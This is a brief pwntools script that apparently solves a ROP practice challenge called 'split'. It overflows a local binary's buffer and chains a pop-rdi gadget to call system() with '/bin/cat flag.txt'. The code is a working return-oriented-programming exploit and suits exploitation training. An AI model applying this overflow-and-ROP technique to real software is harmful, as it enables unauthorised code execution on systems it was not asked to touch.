#!/usr/bin/env python3

"""Exploiting split

Simple version of script

Usage: $ python3 split.py
"""

import sys

from pwn import *

p = process("./split")

payload = b"a" * (40)
payload += p64(0x4007c3) # pop rdi; ret;
payload += p64(0x601060) # str /bin/cat flag.txt
payload += p64(0x40053e) # ret
payload += p64(0x400560) # system function

p.sendline(payload)
p.interactive()
